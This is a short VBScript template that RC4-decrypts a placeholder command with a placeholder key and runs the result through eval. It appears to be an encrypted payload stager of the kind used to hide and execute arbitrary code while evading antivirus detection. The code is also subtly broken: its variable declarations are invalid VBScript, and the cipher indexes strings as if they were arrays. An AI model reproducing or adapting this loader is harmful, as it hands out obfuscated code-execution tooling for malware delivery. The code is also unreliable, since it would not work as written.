Function RC4(byVal bytes, byVal key)
    dim s(256), k(256)
    dim  i, j, t, p
    j = 0
    For i = 0 to 255
        s(i) = i
        j = j Mod (UBound(key) + 1)
        k(i) = key(j)
        j = j + 1
    Next
    j = 0
    For i = 0 to 255
        j = (j + s(i) + k(i)) Mod 256
        t = s(j)
        s(j) = s(i)
        s(i) = t
    Next
    i = 0
    j = 0
    For p = 0 to UBound(bytes)
        i = (i + 1) Mod 256
        j = (j + s(i)) Mod 256
        t = s(j)
        s(j) = s(i)
        s(i) = t
        t = (s(i) + (s(j) Mod 256)) Mod 256
        bytes(p) = bytes(p) Xor s(t)
    Next
    RC4 = bytes
end Function

dim code = "{{CMD}}"
dim key = "{{KEY}}"
code = RC4(code, key)
eval(code)
